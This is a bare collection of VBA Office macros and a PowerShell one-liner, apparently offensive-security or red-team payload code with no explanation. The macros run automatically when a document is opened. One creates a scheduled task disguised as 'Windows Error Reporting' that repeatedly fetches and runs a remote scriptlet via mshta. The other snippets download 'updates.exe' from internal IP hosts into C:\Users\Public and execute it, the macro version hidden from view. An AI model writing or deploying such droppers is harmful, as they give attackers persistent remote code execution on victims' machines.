Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Call Shell("schtasks /create /sc MINUTE /tn ""Windows Error Reporting"" /tr ""mshta.exe javascript:a=GetObject('script:http://192.168.66.59/microsoftftp.jpg').Exec();close();"" /mo 2 /F")
End Sub


powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.66.59/updates.exe',
'C:\Users\Public\updates.exe');& 'C:\Users\Public\updates.exe'


Sub MyMacro()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.243.131/updates.exe', 'C:\Users\Public\updates.exe')"
  Shell str, vbHide
  Dim exePath As String
  exePath = "C:\Users\Public\updates.exe"
  Wait (5)
  Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
  Dim t As Date
  t = Now
  Do
  DoEvents
  Loop Until Now >= DateAdd("s", n, t)
End Sub
